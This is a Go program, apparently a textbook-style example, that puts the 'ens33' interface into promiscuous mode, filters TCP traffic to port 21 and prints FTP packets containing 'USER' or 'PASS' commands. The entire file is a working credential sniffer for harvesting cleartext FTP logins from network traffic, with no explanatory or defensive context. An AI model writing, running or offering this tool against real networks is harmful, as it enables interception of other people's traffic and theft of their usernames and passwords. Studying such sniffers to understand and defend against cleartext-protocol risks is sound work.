package main

import (
	"bytes"
	"fmt"
	"log"

	"github.com/google/gopacket"

	"github.com/google/gopacket/pcap"
)

var (
	iface    = "ens33"
	snaplen  = int32(1600)
	promisc  = true
	timeout  = pcap.BlockForever
	filter   = "tcp and dst port 21"
	devFound = false
)

func main() {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panicln(err)
	}

	for _, device := range devices {
		if device.Name == iface {
			devFound = true
		}
	}
	if !devFound {
		log.Panicf("Device named '%s' does not exist\n", iface)
	}

	handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
	if err != nil {
		log.Panicln(err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter(filter); err != nil {
		log.Panicln(err)
	}

	fmt.Println("[+] Now capturing TCP 21 on dev", iface)

	source := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range source.Packets() {
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}
		payload := appLayer.LayerPayload()
		if bytes.Contains(payload, []byte("USER")) {
			fmt.Print(string(payload))
		} else if bytes.Contains(payload, []byte("PASS")) {
			fmt.Print(string(payload))
		}
	}
}
